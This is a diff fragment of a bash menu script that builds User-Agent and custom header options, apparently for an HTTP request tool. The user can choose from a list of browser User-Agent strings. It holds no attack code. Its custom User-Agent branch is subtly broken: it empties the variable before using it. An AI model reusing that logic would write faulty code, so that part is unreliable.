"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 EdgA/97.0.1072.69" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/97.1072.69 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 Edge/40.15254.603" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edge/44.18363.8131" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPod touch; CPU iPhone 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "custom" "exit"
+		do
+			if [[ "$CHOICE" != "exit" ]];
+			then
+				if [[ "$CHOICE" == "custom" ]];
+				then
+					read -p "Digit a custom User-Agent: " USERAGENT
+					if [[ "$USERAGENT" != "" ]];
+					then
+						USERAGENT=""
+						USERAGENT="--user-agent ""$USERAGENT"
+					fi
+				else
+					USERAGENT=""
+					USERAGENT="--user-agent ""$CHOICE"
+				fi
+			fi
+			break
+		done
+	;;
+	"2655")
+		echo "Digit header to add into array"
+		HEADER=""
+		while [[ "$HEADER" != "exit" ]];
+		do
+			HEADER=""
+			read -p "(digit exit to finish): " HEADER
+			if [[ "$HEADER" != "exit" ]];
+			then
+				HEADERS+=("$HEADER")
+			else
+				break
+			fi
+		done
+		for HDR in "${HEADERS[@]}"
+		do
+			if [[ "$SHEADER" != "" ]];
+			then
+				SHEADER="$SHEADER"" --header ""$HDR"
+			else
+				SHEADER="--header ""$HDR"
+			fi
+		done
 	;;
 	"AA")
 		if [[ "$CAA" == "[+]" ]];
